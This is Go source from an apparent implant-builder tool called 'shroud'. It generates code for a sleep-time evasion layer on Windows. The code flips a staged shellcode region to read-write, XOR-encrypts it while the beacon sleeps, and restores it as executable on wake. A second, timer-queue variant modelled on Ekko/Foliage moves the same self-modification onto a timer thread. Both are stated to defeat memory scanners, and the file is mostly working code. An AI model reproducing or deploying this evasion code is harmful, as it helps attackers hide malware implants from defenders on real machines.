// sleep.go — the `sleep` evasion layer (tier-1: memory-encrypt-during-sleep).
//
// Mirrors the original Python tool's `shroud_sleep_xor` primitive: while the
// beacon sleeps, the staged payload region is flipped to PAGE_READWRITE and
// XOR-scrambled so a memory scanner sees no executable plaintext. XOR is
// symmetric, so the same routine decrypts on wake. FlushInstructionCache
// invalidates the stale I-cache after the region is restored to RX.
//
// Integration model (same as the original tool):
//   - With `-e sleep` and no `--sleep` duration: the sleepScramble helper + sleep
//     key are emitted as available primitives for the beacon's own sleep path.
//     shroud cannot inject the call into opaque shellcode (meterpreter, …) —
//     that requires shellcode patching (Ekko/Foliage territory, the tier-2
//     stretch). A custom/cooperative beacon calls sleepScramble itself.
//   - With `--sleep <dur>`: a self-contained demo loop (sleepLoop) exercises the
//     primitive on the staged region in a loop (stage -> scramble/sleep/unscramble,
//     no shellcode execution). This is the verification/demo path: on a Windows
//     target the operator observes the region cycling RW-ciphertext -> RX-plaintext
//     each cycle, confirming the scanner-defeat. The original tool ships the same
//     "self-contained demo" alongside the helper.
//
// Defeats: memory scanners that scan during the sleep window (region is
// ciphertext + non-executable while idle). Does NOT defeat active real-time
// inspection or kernel callbacks. See SECURITY.md.
package payload

import (
	"fmt"
	"strconv"
	"strings"

	"shroud/internal/evasion"
)

// sleepKeyBytes is the deterministic 16-byte XOR key for the sleep scramble,
// matching the original tool's g_skey = bytes((i*7 + 0x5a) & 0xff for i in 16).
// Emitted as a numeric byte literal (no plaintext key string in the binary).
var sleepKeyBytes = []byte{
	0x5a, 0x61, 0x68, 0x6f, 0x76, 0x7d, 0x84, 0x8b,
	0x92, 0x99, 0xa0, 0xa7, 0xae, 0xb5, 0xbc, 0xc3,
}

// sleepHelper emits the sleepScramble primitive + the sleep key, armed whenever
// the sleep layer is active. The helper is self-contained and may be unused
// (package-level unused funcs/vars are legal in Go) when --sleep is not set — it
// is available for a cooperative beacon to call from its own sleep path.
func (b *Builder) sleepHelper() string {
	if !evasion.Has(b.Spec.Layers, evasion.LayerSleep) {
		return ""
	}
	_, hVP := b.api("kernel32.dll", "VirtualProtect")
	_, hSleep := b.api("kernel32.dll", "Sleep")
	_, hFIC := b.api("kernel32.dll", "FlushInstructionCache")
	// numeric-encode the sleep key (no plaintext key string reaches the binary).
	keyLit := numericBytes(sleepKeyBytes)
	return fmt.Sprintf(`// sleepKey — XOR key for the sleep scramble (numeric-encoded; matches the
// original tool's g_skey). XOR is symmetric: scramble on sleep, unscramble on wake.
var sleepKey = []byte(%s)

// sleepScramble encrypts the staged payload region during a sleep window so a
// memory scanner sees no executable plaintext. VirtualProtect -> RW, XOR-scramble
// in place, Sleep(ms), XOR-unscramble, VirtualProtect -> restore RX, flush I-cache.
// Intended to be called from the beacon's sleep path (a custom/cooperative beacon);
// the --sleep flag arms a self-contained demo loop that calls this directly.
func sleepScramble(addr uintptr, n int, ms uint32) {
	var old uintptr
	// drop RX -> RW
	wincall.CallG0(%s, addr, uintptr(n), uintptr(0x04), uintptr(unsafe.Pointer(&old)))
	// XOR-scramble the region in place (symmetric).
	for i := 0; i < n; i++ {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) ^= sleepKey[i%%len(sleepKey)]
	}
	// sleep — region is ciphertext + non-executable while idle
	wincall.CallG0(%s, uintptr(ms))
	// XOR-unscramble (symmetric) — restore plaintext
	for i := 0; i < n; i++ {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) ^= sleepKey[i%%len(sleepKey)]
	}
	// restore RX
	wincall.CallG0(%s, addr, uintptr(n), old, uintptr(unsafe.Pointer(&old)))
	// FlushInstructionCache(GetCurrentProcess()=-1, addr, n) — invalidate stale I-cache
	wincall.CallG0(%s, ^uintptr(0), addr, uintptr(n))
}

`, keyLit, hVP, hSleep, hVP, hFIC)
}

// sleepRun emits the self-contained demo run() + sleepLoop, used when --sleep is
// set (Spec.SleepMS > 0). It stages the payload (RW->RX or module-stomp) and loops
// sleepScramble on the region — exercising the scanner-defeat primitive in
// isolation, without executing the shellcode. A real beacon calls sleepScramble
// from its own sleep path instead.
func (b *Builder) sleepRun() string {
	var sb strings.Builder
	sb.WriteString("func run() {\n")
	if init := b.evasionInit(); init != "" {
		sb.WriteString(init + "\n")
	}
	sb.WriteString("\tpayload := " + b.decryptOrRaw() + "\n")
	sb.WriteString("\taddr := " + b.stage() + "\n")
	sb.WriteString("\tif addr == 0 {\n\t\treturn\n\t}\n")
	sb.WriteString("\tsleepLoop(addr, len(payload), " + strconv.FormatUint(uint64(b.Spec.SleepMS), 10) + ")\n")
	sb.WriteString("}\n\n")
	sb.WriteString(b.sleepLoopBody())
	return sb.String()
}

// sleepLoopBody emits the sleepLoop driver: an infinite scramble/sleep/unscramble
// cycle on the staged region. The region is RW + ciphertext during each sleep
// window and RX + plaintext between cycles.
func (b *Builder) sleepLoopBody() string {
	return `// sleepLoop drives the sleepScramble primitive on the staged region in a loop.
// Demo/verification mode (armed by --sleep): the payload is staged but not executed;
// each cycle the region is encrypted (RW), the implant sleeps, then decrypted (RX).
// A real beacon calls sleepScramble from its own sleep path instead of this loop.
func sleepLoop(addr uintptr, n int, ms uint32) {
	for {
		sleepScramble(addr, n, ms)
	}
}

`
}

// numericBytes renders a byte slice as a Go numeric byte literal
// ([]byte{0x5a, 0x61, ...}) so no plaintext reaches the binary.
func numericBytes(b []byte) string {
	parts := make([]string, len(b))
	for i, x := range b {
		parts[i] = fmt.Sprintf("0x%02x", x)
	}
	return "[]byte{" + strings.Join(parts, ", ") + "}"
}

// --- tier-2: Ekko/Foliage-style timer-driven self-modifying sleep -------------
//
// ekkoSleepRun emits the run() + ekkoSleep + ekkoTimerCb used when --sleep-scheme
// ekko is selected (with -e sleep --sleep > 0). It is the tier-2 stretch from the
// plan: a timer-driven self-modifying sleep that decouples the encrypt/decrypt
// from the beacon thread, the defining property of Ekko/Foliage.
//
// Model (Foliage-flavored — timer + callback, not Ekko's CONTEXT-ROP):
//   - The beacon thread creates an auto-reset event, schedules a one-shot
//     CreateTimerQueueTimer whose callback is a Go func bridged via
//     wincall.NewCallback, then parks in WaitForSingleObject(event, INFINITE).
//     During the whole sleep window the beacon's stack is just the wait.
//   - The timer thread fires ekkoTimerCb, which: VirtualProtect -> RW + XOR-encrypt
//     the staged region, Sleep(ms) on the timer thread (the sleep window), XOR-decrypt
//     + restore RX, FlushInstructionCache, SetEvent. The self-modification
//     (encrypt/decrypt) therefore runs OFF the beacon thread, and the staged region
//     is ciphertext + non-executable for the entire window.
//
// shroud encrypts the STAGED PAYLOAD region (the shellcode), NOT the Go runtime's
// own .text. Ekko encrypts its own .text because Ekko is PIC shellcode; a compiled
// Go binary's .text IS the running runtime and must not be touched. The tier-2
// advance over tier-1 (sleepScramble) is the timer-driven, off-beacon-thread
// self-modification.
//
// EXPERIMENTAL: the go-wincall callback bridge (NewCallback), CreateTimerQueueTimer
// one-shot timing, and the staged-region address handed across the callback boundary
// need Windows on-target verification. Tier-1 (sleepScramble, --sleep-scheme xor)
// remains the safe default.
func (b *Builder) ekkoSleepRun() string {
	var sb strings.Builder
	sb.WriteString("func run() {\n")
	if init := b.evasionInit(); init != "" {
		sb.WriteString(init + "\n")
	}
	sb.WriteString("\tpayload := " + b.decryptOrRaw() + "\n")
	sb.WriteString("\taddr := " + b.stage() + "\n")
	sb.WriteString("\tif addr == 0 {\n\t\treturn\n\t}\n")
	sb.WriteString("\tekkoSleep(addr, len(payload), " + strconv.FormatUint(uint64(b.Spec.SleepMS), 10) + ")\n")
	sb.WriteString("}\n\n")
	sb.WriteString(b.ekkoBody())
	return sb.String()
}

// ekkoBody registers the tier-2 API consts and emits the ekkoSleep driver +
// ekkoTimerCb callback + the shared ekkoCtx struct/var.
func (b *Builder) ekkoBody() string {
	_, hCE := b.api("kernel32.dll", "CreateEventW")
	_, hCTQT := b.api("kernel32.dll", "CreateTimerQueueTimer")
	_, hWFSO := b.api("kernel32.dll", "WaitForSingleObject")
	_, hSE := b.api("kernel32.dll", "SetEvent")
	_, hVP := b.api("kernel32.dll", "VirtualProtect")
	_, hSleep := b.api("kernel32.dll", "Sleep")
	_, hFIC := b.api("kernel32.dll", "FlushInstructionCache")
	_, hCH := b.api("kernel32.dll", "CloseHandle")
	return fmt.Sprintf(`// ekkoCtxT holds the parameters ekkoTimerCb reads across the windows->go
// callback boundary (closures cannot cross it). Written by ekkoSleep before the
// timer fires; read by ekkoTimerCb on the timer thread. EXPERIMENTAL tier-2.
type ekkoCtxT struct {
	Addr  uintptr
	N     int
	Ms    uint32
	Event uintptr
	Old   uintptr // original protection captured at encrypt, restored at decrypt
}

// ekkoCtx is the shared callback context (single sleep loop per implant).
var ekkoCtx ekkoCtxT

// ekkoSleep — timer-driven self-modifying sleep (Ekko/Foliage tier-2).
//
// The beacon thread creates an auto-reset event, schedules a one-shot timer whose
// callback runs on a TIMER THREAD, then parks in WaitForSingleObject. The timer
// callback (ekkoTimerCb) does the encrypt -> sleep -> decrypt -> wake, all OFF the
// beacon thread. The staged region is ciphertext + non-executable for the whole
// sleep window; the beacon's stack during sleep is just the wait.
//
// shroud encrypts the STAGED PAYLOAD region, not the Go runtime .text (Ekko
// encrypts its own .text because it is PIC shellcode). The tier-2 advance over
// tier-1 is the off-beacon-thread self-modification.
//
// EXPERIMENTAL — the NewCallback bridge + CreateTimerQueueTimer timing need
// Windows on-target verification.
func ekkoSleep(addr uintptr, n int, ms uint32) {
	// auto-reset event, initially non-signaled — the timer callback SetEvents it on wake.
	hEvt, _, _ := wincall.CallG0(%[1]s, 0, 0, 0, 0)
	if hEvt == 0 {
		return
	}
	// bridge the Go callback into a windows-callable trampoline
	cb := wincall.NewCallback(ekkoTimerCb)
	// stash params for the timer-thread callback
	ekkoCtx.Addr = addr
	ekkoCtx.N = n
	ekkoCtx.Ms = ms
	ekkoCtx.Event = hEvt
	// one-shot timer: dueTime=0 (fire ASAP on a timer thread), period=0 (no repeat).
	var hTimer uintptr
	wincall.CallG0(%[2]s, uintptr(unsafe.Pointer(&hTimer)), 0, cb, 0, 0, 0, 0)
	// park the beacon: stack is just the wait while the timer thread self-modifies
	wincall.CallG0(%[3]s, hEvt, uintptr(0xFFFFFFFF)) // INFINITE
	// cleanup
	wincall.CallG0(%[8]s, hEvt)
	wincall.CallG0(%[8]s, hTimer)
}

// ekkoTimerCb runs on a timer thread: XOR-encrypt the staged region (RW), sleep the
// window, XOR-decrypt + restore RX, flush the I-cache, and wake the beacon. The
// self-modification runs OFF the beacon thread — the Ekko/Foliage property.
func ekkoTimerCb(args unsafe.Pointer) uintptr {
	addr := ekkoCtx.Addr
	n := ekkoCtx.N
	var old uintptr
	// encrypt: flip RX -> RW, XOR-scramble. Region is ciphertext + non-exec while idle.
	wincall.CallG0(%[5]s, addr, uintptr(n), uintptr(0x04), uintptr(unsafe.Pointer(&old)))
	ekkoCtx.Old = old
	for i := 0; i < n; i++ {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) ^= sleepKey[i%%len(sleepKey)]
	}
	// sleep window ON the timer thread (beacon is parked in WaitForSingleObject)
	wincall.CallG0(%[6]s, uintptr(ekkoCtx.Ms))
	// decrypt: XOR-unscramble (symmetric) -> restore original protection (RX)
	for i := 0; i < n; i++ {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) ^= sleepKey[i%%len(sleepKey)]
	}
	wincall.CallG0(%[5]s, addr, uintptr(n), ekkoCtx.Old, uintptr(unsafe.Pointer(&old)))
	// FlushInstructionCache(GetCurrentProcess()=-1, addr, n) — invalidate stale I-cache
	wincall.CallG0(%[7]s, ^uintptr(0), addr, uintptr(n))
	// wake the beacon
	wincall.CallG0(%[4]s, ekkoCtx.Event)
	return 0
}

`, hCE, hCTQT, hWFSO, hSE, hVP, hSleep, hFIC, hCH)
}